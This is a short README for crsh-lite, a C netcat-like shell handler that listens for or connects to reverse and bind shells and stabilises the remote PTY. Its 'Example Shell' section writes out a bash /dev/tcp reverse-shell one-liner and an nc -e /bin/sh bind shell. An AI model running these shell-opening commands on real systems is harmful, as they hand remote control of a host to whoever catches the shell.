# crsh-lite

crsh-lite is a light shell handler written in C, meant to make the process of remote administration easier. 

It uses netcat-like functionality to provide asynchronous I/O operations on the remote host. It also automatically spawns a PTY, stabilizes your prompt and resizes the remote terminal, as your local one changes.

crsh-lite is stageless, and only requires a normal reverse or bind shell to be executed. It's essentially a netcat program, but you don't have to worry about spawning a PTY, pressing CTRL+Z, setting your terminal to raw mode, etc.

## Example Compilation

```bash
$ make
```

## Syntax

```bash
# Server mode (listen)
$ ./crsh-lite <LPORT>

# Client Mode (connect)
$ ./crsh-lite <RPORT> <RHOST>
```

## Example Usage

```bash
$ ./crsh-lite 9001
$ ./crsh-lite 1337 localhost
```

## Example Shell

```bash
bash -i >&/dev/tcp/localhost/9001
nc -lvp 1337 -e /bin/sh
```
